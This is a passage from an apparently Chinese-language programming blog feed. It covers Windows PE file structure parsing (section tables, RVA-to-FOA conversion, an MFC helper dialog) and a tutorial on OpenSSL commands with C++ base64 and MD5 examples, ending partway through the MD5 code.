一定会小于SizeOfRawData？</p><p>不是的，有可能是这个区段在文件中没有数据，运行起来之后，才有数据。</p><h3 id="测试代码-4"><a href="#测试代码-4" class="headerlink" title="测试代码"></a>测试代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AnalyzeNTHeader</span><span class="params">(<span class="keyword">char</span>* lpImage)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 找到NT头</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);</span><br><span class="line">    PIMAGE_FILE_HEADER pFileHeader = &amp;pNt-&gt;FileHeader;</span><br><span class="line">    PIMAGE_OPTIONAL_HEADER pOption = &amp;pNt-&gt;OptionalHeader;</span><br><span class="line"><span class="comment">//2 开始解析文件头</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;运行平台:%x\n&quot;</span>,pFileHeader-&gt;Machine);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;区段数量:%x\n&quot;</span>, pFileHeader-&gt;NumberOfSections);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;扩展头大小:%x\n&quot;</span>, pFileHeader-&gt;SizeOfOptionalHeader);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;时间戳:%x\n&quot;</span>, pFileHeader-&gt;TimeDateStamp);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;属性:%x\n&quot;</span>, pFileHeader-&gt;Characteristics);</span><br><span class="line"><span class="comment">//3 解析扩展头</span></span><br><span class="line"><span class="comment">//。。。</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AnalyzeSectionTable</span><span class="params">(<span class="keyword">char</span>* lpImage)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 获取区段表的起始位置</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);</span><br><span class="line">PIMAGE_SECTION_HEADER pHeader = IMAGE_FIRST_SECTION(pNt);</span><br><span class="line"><span class="comment">//2 解析</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span>  i = <span class="number">0</span>; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;区段名：%s\t&quot;</span>, pHeader[i].Name);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;内存中大小：%X\t&quot;</span>, pHeader[i].Misc.VirtualSize);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;内存中RVA：%X\t&quot;</span>, pHeader[i].VirtualAddress);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;文件中大小：%X\t&quot;</span>, pHeader[i].SizeOfRawData);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;文件中FOA：%X\t&quot;</span>, pHeader[i].PointerToRawData);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;属性：%X\t&quot;</span>, pHeader[i].Characteristics);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="RVA和FOA之间的转换"><a href="#RVA和FOA之间的转换" class="headerlink" title="RVA和FOA之间的转换"></a>RVA和FOA之间的转换</h2><p>文件偏移（FOA或者Offset）： 某一个数据距离文件开头的偏移</p><h3 id="RVA怎么转换成FOA"><a href="#RVA怎么转换成FOA" class="headerlink" title="RVA怎么转换成FOA"></a>RVA怎么转换成FOA</h3><p>  RVA - RVA区段   =   FOA -FOA区段</p><p>  FOA = RVA - RVA区段+FOA区段</p><h3 id="一般情况下，PE文件的头部在文件中是多大？"><a href="#一般情况下，PE文件的头部在文件中是多大？" class="headerlink" title="一般情况下，PE文件的头部在文件中是多大？"></a>一般情况下，PE文件的头部在文件中是多大？</h3><p>0x400</p><h3 id="PE文件的头部在内存中是多大"><a href="#PE文件的头部在内存中是多大" class="headerlink" title="PE文件的头部在内存中是多大"></a>PE文件的头部在内存中是多大</h3><p>0x1000</p><p>RVA为0x600的时候，转为FOA  转不了，在文件中没有对应的位置</p><p>虚拟地址（VA）：程序在运行的时候，是将PE文件加载到进程的内存空间中。进程的这块内存空间就称之为  虚拟内存空间  32位程序虚拟内存空间是以字节为单位的，每一个字节都有一个编号从0x0000 0000到0xFFFFFFFF之间。这些编号就是<strong>虚拟地址</strong>。</p><p>相对虚拟地址（RVA）：PE文件不会占满整个虚拟内存空间，而是会占用一部分。那么就会有一个起始位置，这个起始位置也成为加载基址。PE文件中的数据相对于加载基址的偏移就是<strong>相对虚拟地址。</strong></p><p><strong>如果系统加载PE文件的时候，是将PE文件原封不动的复制到了内存中，那么某一个数据的FOA和RVA就是相等的。</strong></p><p><strong>但是现实情况并非如此，系统加载PE文件到内存的之后，PE文件是被扩展了的。</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">RvaToFoa</span><span class="params">(<span class="keyword">char</span>* lpImage,DWORD dwRva)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//1 获取区段表的起始位置</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)lpImage;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + lpImage);</span><br><span class="line">PIMAGE_SECTION_HEADER pHeader = IMAGE_FIRST_SECTION(pNt);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dwRva&lt; pNt-&gt;OptionalHeader.SizeOfHeaders)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> dwRva;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2 循环判断RVA落在了哪个区段中</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line">DWORD dwSectionRva =  pHeader[i].VirtualAddress;</span><br><span class="line">DWORD dwSectionEndRva = dwSectionRva + pHeader[i].SizeOfRawData;</span><br><span class="line">DWORD dwSectionFOA = pHeader[i].PointerToRawData;</span><br><span class="line"><span class="keyword">if</span> (dwRva&gt;= dwSectionRva &amp;&amp;dwRva&lt;= dwSectionEndRva)</span><br><span class="line">&#123;</span><br><span class="line">pHeader[i].VirtualAddress;</span><br><span class="line">DWORD dwFOA = dwRva - dwSectionRva+ dwSectionFOA;</span><br><span class="line"><span class="keyword">return</span> dwFOA;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="小功能的实现"><a href="#小功能的实现" class="headerlink" title="小功能的实现"></a>小功能的实现</h2><h3 id="位置计算"><a href="#位置计算" class="headerlink" title="位置计算"></a>位置计算</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//位置计算器按钮</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CPEDlg::OnBnClickedButton2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">UpdateData(TRUE);</span><br><span class="line"><span class="keyword">if</span> (m_strEditTest1 != <span class="string">L&quot;&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">CMGpsCalcDlg* pPrcPopDg = <span class="keyword">new</span> CMGpsCalcDlg;</span><br><span class="line"></span><br><span class="line">pPrcPopDg-&gt;Create(IDD_DIALOG1, <span class="keyword">this</span>);</span><br><span class="line">pPrcPopDg-&gt;ShowWindow(SW_SHOW);</span><br><span class="line">pPrcPopDg-&gt;GetPath(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CMGpsCalcDlg::RvaToFoa</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">UpdateData(TRUE);</span><br><span class="line"></span><br><span class="line">CString svPid = m_strEditRva.GetString();</span><br><span class="line">DWORD dwRva = _tcstoul(svPid, <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//1 获取区段表的起始位置</span></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)buf;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + buf);</span><br><span class="line">PIMAGE_SECTION_HEADER pHeader = IMAGE_FIRST_SECTION(pNt);</span><br><span class="line">PIMAGE_OPTIONAL_HEADER pOption = &amp;pNt-&gt;OptionalHeader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (dwRva &lt; pNt-&gt;OptionalHeader.SizeOfHeaders)</span><br><span class="line">&#123;</span><br><span class="line">CString cd;</span><br><span class="line">cd.Format(<span class="string">L&quot;%x&quot;</span>, dwRva);</span><br><span class="line">m_strEditFoa.SetString(cd);</span><br><span class="line">UpdateData(FALSE);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2 循环判断RVA落在了哪个区段中</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pNt-&gt;FileHeader.NumberOfSections; i++)</span><br><span class="line">&#123;</span><br><span class="line">DWORD dwSectionRva = pHeader[i].VirtualAddress;</span><br><span class="line">DWORD dwSectionEndRva = dwSectionRva + pHeader[i].SizeOfRawData;</span><br><span class="line">DWORD dwSectionFOA = pHeader[i].PointerToRawData;</span><br><span class="line"><span class="keyword">if</span> (dwRva &gt;= dwSectionRva &amp;&amp; dwRva &lt;= dwSectionEndRva)</span><br><span class="line">&#123;</span><br><span class="line">pHeader[i].VirtualAddress;</span><br><span class="line"></span><br><span class="line"><span class="comment">//FOA= RVA   - RVA区段   + FOA区段</span></span><br><span class="line">DWORD dwFOA = dwRva - dwSectionRva + dwSectionFOA;</span><br><span class="line">CString foa;</span><br><span class="line">foa.Format(<span class="string">L&quot;%x&quot;</span>,dwFOA);</span><br><span class="line">m_strEditFoa.SetString(foa);</span><br><span class="line"></span><br><span class="line"><span class="comment">//va虚拟地址= InmageBase(加载基址) + RVA(相对虚拟地址)</span></span><br><span class="line">DWORD dwVA = pOption-&gt;ImageBase + dwRva;</span><br><span class="line">CString va;</span><br><span class="line">va.Format(<span class="string">L&quot;%x&quot;</span>, dwVA);</span><br><span class="line">m_strEditVa.SetString(va);</span><br><span class="line"></span><br><span class="line"><span class="comment">//区段名</span></span><br><span class="line">CString name;</span><br><span class="line">name.Format(<span class="string">L&quot;%S&quot;</span>, pHeader[i].Name);</span><br><span class="line">m_strEditName.SetString(name);</span><br><span class="line"></span><br><span class="line">UpdateData(FALSE);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">MessageBox(<span class="string">L&quot;不存在该地址&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="响应拖拽"><a href="#响应拖拽" class="headerlink" title="响应拖拽"></a>响应拖拽</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//响应文件拖拽</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CPEDlg::OnDropFiles</span><span class="params">(HDROP hDropInfo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 存放文件路径</span></span><br><span class="line"><span class="keyword">wchar_t</span> filePath[MAX_PATH] = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取拖拽文件的路径</span></span><br><span class="line">DragQueryFile(hDropInfo, <span class="number">0</span>, filePath, MAX_PATH);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 更新变量</span></span><br><span class="line">m_strEditPath = filePath;</span><br><span class="line">UpdateData(FALSE);</span><br><span class="line"></span><br><span class="line">CDialogEx::OnDropFiles(hDropInfo);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="时间换算"><a href="#时间换算" class="headerlink" title="时间换算"></a>时间换算</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//时间转换</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CPEDlg::OnBnClickedButton3</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)buf;</span><br><span class="line">PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + buf);</span><br><span class="line">PIMAGE_FILE_HEADER pFileHeader = &amp;pNt-&gt;FileHeader;<span class="comment">//NT头</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tm</span>* <span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">time_t</span> t =pFileHeader-&gt;TimeDateStamp;</span><br><span class="line">p = localtime(&amp;t);</span><br><span class="line">CString Time;</span><br><span class="line">Time.Format(<span class="string">L&quot;%d年%d月%d日%d时%d分%d秒&quot;</span>, <span class="number">1900</span> + p-&gt;tm_year, <span class="number">1</span> + p-&gt;tm_mon, p-&gt;tm_mday, p-&gt;tm_hour, p-&gt;tm_min, p-&gt;tm_sec);</span><br><span class="line">MessageBox(Time);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="PE文件结构图"><a href="#PE文件结构图" class="headerlink" title="PE文件结构图"></a>PE文件结构图</h2><img src="PE文件/pe7.png" title="Mr.Hu-Image" alt="Mr.Hu-Image"/>]]></content>
      
      
      <categories>
          
          <category> Windows编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows编程 </tag>
            
            <tag> PE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Openssl————指令</title>
      <link href="2020/12/05/Openssl/"/>
      <url>2020/12/05/Openssl/</url>
      
        <content type="html"><![CDATA[<h1 id="openssl指令"><a href="#openssl指令" class="headerlink" title="openssl指令"></a>openssl指令</h1><p>base64 编码: openssl enc -base64 -in plain.txt -out base64.txt<br>    enc： 通用加密指令<br>    -base64: 指定加密方式为 base64<br>    -in 文件名: 需要进行 base64 的文件<br>    -out 文件名: base64 后的文件保存到哪里<br>    -e(默认): 表示当前需要执行编码操作</p><p>base64 解码: openssl enc -d -base64 -in plain.txt -out base64.txt<br>    -d: 表示当前需要执行解码操作</p><p>查看 md5 输出到控制台: openssl dgst -md5 demo.exe<br>查看 md5 输出到文件中: openssl dgst -md5 -out md5.txt demo.exe<br>    -md5: 指定使用 md5 算法计算消息摘要，通过 help 查看支持的所有算法</p><p>对称加密: openssl enc -des-cbc -in demo.png -out encrypt.png -pass pass:12345678<br>    -des-cbc: 指定加密方式和分组模式，使用 help 查看所有<br>    -pass: 指定对称加密使用的 key</p><p>生成公钥：<br>    openssl rsa -in pri.pem -pubout pub.pem<br>生成私钥：<br>    openssl genrsa -out private.pem 1024<br>加密文件：<br>    openssl rsautl -encrypt -in md5.txt -inkey pub.pem -pubin -out md5.en<br>解密文件：<br>    openssl rsautl -decrypt -inkey private.pem -in file.rsa -out file</p><h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/bio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/buffer.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/evp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;libcrypto.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 在项目属性的目录中添加 openssl 的 lib 和 include 路径</span></span><br><span class="line"><span class="comment">// 2. 用到了什么东西就加上相应的头文件</span></span><br><span class="line"><span class="comment">// 3. 必须需要链接到 libcrypto.lib 静态库</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 要求传入一个需要加密的串，以及串的长度，参数三是否需要换行，返回编码后的数据</span></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">Base64Encode</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* input, <span class="keyword">int</span> length, <span class="keyword">bool</span> with_new_line)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// 创建一个 base64 对象，对象的特点就是使用 write 写入的</span></span><br><span class="line"><span class="comment">// 数据会被自动编码，使用 read 读取的数据会自动解码</span></span><br><span class="line">BIO* b64 = BIO_new(BIO_f_base64());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认编码之后存在换行符，通常不需要换行符</span></span><br><span class="line"><span class="keyword">if</span> (!with_new_line)</span><br><span class="line">BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 再次创建了一个内存对象，对象的特点就是使用 write 写入的</span></span><br><span class="line"><span class="comment">// 数据会自动保存到某一个缓冲区。BIO_push 将两个对象进行关</span></span><br><span class="line"><span class="comment">// 联，也就是说传入的数据首先会进行 base64 编码，然后保存到</span></span><br><span class="line"><span class="comment">// 缓冲区。</span></span><br><span class="line">b64 = BIO_push(b64, BIO_new(BIO_s_mem()));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将传入的数据进行编码，BIO_flush 将操作刷新到对象</span></span><br><span class="line">BIO_write(b64, input, length);</span><br><span class="line">BIO_flush(b64);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从 base64 对象中获取到相应的编码后的内容</span></span><br><span class="line">BUF_MEM* bptr = <span class="literal">NULL</span>;</span><br><span class="line">BIO_get_mem_ptr(b64, &amp;bptr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将编码后的数据拷贝到指定的位置</span></span><br><span class="line"><span class="keyword">char</span>* b64encode = <span class="keyword">new</span> <span class="keyword">char</span>[bptr-&gt;max]&#123;&#125;;</span><br><span class="line"><span class="built_in">memcpy</span>(b64encode, bptr-&gt;data, bptr-&gt;max);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 清理 BIO 对象，并返回结果</span></span><br><span class="line">BIO_free_all(b64);</span><br><span class="line"><span class="keyword">return</span> b64encode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">char</span>* <span class="title">Base64Decode</span><span class="params">(<span class="keyword">char</span>* input, <span class="keyword">int</span> length, <span class="keyword">bool</span> with_new_line)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">BIO* b64 = BIO_new(BIO_f_base64());</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!with_new_line)</span><br><span class="line">BIO_set_flags(b64, BIO_FLAGS_BASE64_NO_NL);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 编码后的长度和原文大概比例是 4:3，使用编码后的长度</span></span><br><span class="line"><span class="comment">// 进行解码，空间是绝对足够的</span></span><br><span class="line"><span class="keyword">char</span>* buffer = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(length);</span><br><span class="line"><span class="keyword">if</span> (buffer) <span class="built_in">memset</span>(buffer, <span class="number">0</span>, length);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建一个内存对象，存入编码后的内容，并关联到 base64 对象</span></span><br><span class="line">BIO* bmem = BIO_push(b64, BIO_new_mem_buf(input, length));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对 base64 read 就是解码数据</span></span><br><span class="line">BIO_read(bmem, buffer, length);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 清理并返回原文</span></span><br><span class="line">BIO_free_all(bmem);</span><br><span class="line"><span class="keyword">return</span> buffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">auto</span> b64e = Base64Encode(<span class="string">&quot;hello15pbo&quot;</span>, <span class="number">10</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b64e: %s\n&quot;</span>, b64e);</span><br><span class="line"></span><br><span class="line"><span class="keyword">auto</span> b64d = Base64Decode(b64e, <span class="built_in">strlen</span>(b64e), <span class="literal">false</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b64d: %s\n&quot;</span>, b64d);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/md5.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;openssl/sha.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;libcrypto.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">md5_encrypt</span><span class="params">(<span class="keyword">const</span> <span 